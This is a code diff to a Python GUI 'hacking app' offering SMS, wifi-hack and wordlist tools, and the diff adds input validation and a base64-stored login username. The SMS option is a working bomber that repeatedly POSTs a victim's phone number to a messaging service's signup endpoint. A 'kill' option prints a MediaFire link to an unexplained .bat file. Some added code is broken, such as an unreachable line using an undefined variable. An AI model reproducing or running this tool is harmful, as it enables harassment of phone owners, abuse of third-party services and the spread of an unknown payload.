@@ -3,7 +3,9 @@ from tkinter import *
 from datetime import *
 from requests import *
 from random import *
+from base64 import *
 from time import sleep
+from sys import stdout
 import webbrowser
 import subprocess
 
@@ -17,7 +19,7 @@ logo = """\033[33m
       ███    ███     ███    ███ ███    ███   ███ ▀███▄ ███  ███   ███   ███    ███      ███    ███   ███          ███         
       ███    █▀      ███    █▀  ████████▀    ███   ▀█▀ █▀    ▀█   █▀    ████████▀       ███    █▀    ███          ███       
                                              ▀                                                                                                         
-                                    \033[34m[✔]             Version 1.0.0               [✔]
+                                    \033[34m[✔]             Version 1.1.5               [✔]
                                     \033[34m[*]        Hacking app create by Sina       [*]
 \033[97m """
 
@@ -40,6 +42,12 @@ class color:
 
 setting_pwd = {'passwords':500,'lenpassword':6}
 
+def sprint(text, second=0.05):
+    for line in text + '\n':
+        stdout.write(line)
+        stdout.flush()
+        sleep(second)
+
 def info() :
     system("cls")
     print(logo)
@@ -52,7 +60,13 @@ def start() :
     print("[4 wifi hack")
     print("[5 wordlist generate")
     print("[99] back to exit")
-    a = int(input("\nselect a option ==> "))
+    try:
+        a = int(input("\nselect a option ==> "))
+    except ValueError:
+        sprint(f"{color.red}\n[!] Please enter only numbers\n")  
+        input("press ENTER to Exit :")
+        exit()
+
     if a == 1 :
         kill()
     elif a == 2 :
@@ -71,14 +85,19 @@ def start() :
         system("cls")
         print(logo)
         start()
-
 def kill() :
     system("cls")
     print(logo)
     print("[1 Link download")
     print("[2 install")
     print("[99] back to all tools \n")
-    a = int(input("select a mode ==> "))
+    try:
+        a = int(input("select a mode ==> "))
+    except ValueError:
+        sprint(f"{color.red}\n[!] Please enter only numbers\n")
+        
+        input("press ENTER to Exit :")
+        exit()
     if a == 1 :
         print("Link download :\033[34mhttps://download1638.mediafire.com/1sqt3nhi7zogou-IB8VOCfhCbKUr_Ye6cjj5YNaual2mOrgdr-X1PusoWQiVG5x-d8cpdhsp4S8reoNkNeGIjukPa7Hi1ypSq0JjMsvLMtWE8sCvTir2qZzhKl3RhMHDgTVmltnb4IdzPW3t8Zo65-62Vc90gO54iVKBUt5YQ5vcTA/m79n3cjmvmzat9g/file.bat")
         input(f"\n{color.white}Press ENTER to continue : ")
@@ -95,13 +114,18 @@ def kill() :
         input(f"\n{color.white}Press ENTER to continue : ")
         system("cls")
         kill()
-
 def bomb() :
     system("cls")
     print(logo)
     print("[1 Link download")
     print("[99] back to all tools \n")
-    a = int(input("select a mode ==> "))
+    try:
+        a = int(input("select a mode ==> "))
+    except ValueError:
+        sprint(f"{color.red}\n[!] Please enter only numbers\n")
+        
+        input("press ENTER to Exit :")
+        exit()
     if a == 1 :  
         input(f"\n{color.white}Press ENTER to continue : ")
         info()
@@ -112,13 +136,18 @@ def bomb() :
         print("\033[91m\nErorr")
         input(f"\n{color.white}Press ENTER to continue : ")
         bomb()
-
 def sms() :
     system("cls")
     print(logo)
     print("[1 Run")
     print("[99] back to all tools \n")
-    a = int(input("select a mode ==> "))
+    try:
+        a = int(input("select a mode ==> "))
+    except ValueError:
+        sprint(f"{color.red}\n[!] Please enter only numbers\n")
+        
+        input("press ENTER to Exit :")
+        exit()
     if a == 1 :
         Enter = input("\n[~] Enter a cellphone : ")
         n = int(input("[~] Enter a range : "))
@@ -126,13 +155,12 @@ def sms() :
         "cellphone": "+98"+Enter
         }
         url = "https://core.gap.im/v1/user/add.json?mobile="+Enter
-
         for sms in range(n+2):
             try:
                 sms = post(url, data=attestation)  
             except:
-                print(color.red+"[!] Error check your connection")
-                input(f"\n{color.white}Press ENTER to continue : ")
+                print(color.red+"\n[!] Error check your connection")
+                input(f"\n{color.white}Press ENTER to Exit : ")
                 sms()
         input(f"\n{color.white}Press ENTER to continue : ")
         info()
@@ -143,13 +171,18 @@ def sms() :
         print("\033[91m\nErorr")
         input(f"\n{color.white}Press ENTER to continue : ")
         sms()
-
 def wifi() :
     system("cls")
     print(logo)
     print("[1 Run")
     print("[99] back to all tools \n")
-    a = int(input("select a mode ==> "))
+    try:
+        a = int(input("select a mode ==> "))
+    except ValueError:
+        sprint(f"{color.red}\n[!] Please enter only numbers\n")
+        
+        input("press ENTER to Exit :")
+        exit()
     if a == 1 :
         system("cls")
         print(logo)
@@ -176,7 +209,6 @@ def wifi() :
         print("\033[91m\nErorr")
         input(f"\n{color.white}Press ENTER to continue : ")
         wifi()
-
 def pwd():
     global setting_pwd
     pchr = "abcdefghijklmnopqrstuvwxyz123456789@!~$%^&*()"
@@ -189,7 +221,13 @@ def pwd():
     print("[3 password char2 (h4x@$)")
     print("[4 setting_pwd")
     print("[99] back to all tools \n")
-    a = int(input("select a mode ==> "))
+    try:
+        a = int(input("select a mode ==> "))
+    except ValueError:
+        sprint(f"{color.red}\n[!] Please enter only numbers\n")
+        
+        input("press ENTER to Exit :")
+        exit()
     if a == 1 :
         load = color.cyan+"loading : "
         name = input("\nEnter a name for password list (*.txt): ")
@@ -215,7 +253,7 @@ def pwd():
         name = input("\nEnter a name for password list (*.txt): ")
         pali = open(name, "w")
         pwd_list = list(pkal) 
-        for y in range(setting_pwd['paswords']):
+        for y in range(setting_pwd['passwords']):
             password = ""
             for i in range(setting_pwd['lenpassword']):
                 password += choice(pwd_list)
@@ -285,16 +323,33 @@ def pwd():
         print("\033[91m\nErorr")
         input(f"\n{color.white}Press ENTER to continue : ")
         pwd()
-
-        
+def program_exists(program):
+    try:
+        subprocess.run(['where', program], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        return True
+    except subprocess.CalledProcessError:
+        return False
+    return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)
 def verifi():
     now = datetime.now()
     username = username_entry.get()
     password = password_entry.get()
     pwd = (now.strftime("%M")*2)+now.strftime("%H")
-    if password == pwd:
-        root.destroy()
-        info()
+    if program_exists("user.txt"):
+        a = open("user.txt", "r") 
+        if password == pwd and username == b64decode(a.read()).decode('utf-8'):
+            root.destroy()
+            info()
+            a.close()
+    else:
+        a = open("user.txt", "w")
+        user = b64encode(username.encode('utf-8')).decode('utf-8')
+        if password == pwd:
+            a.write(user)
+            root.destroy()
+            info()
+            a.close()
+
 
 root = Tk()
 root.title("hacking app")
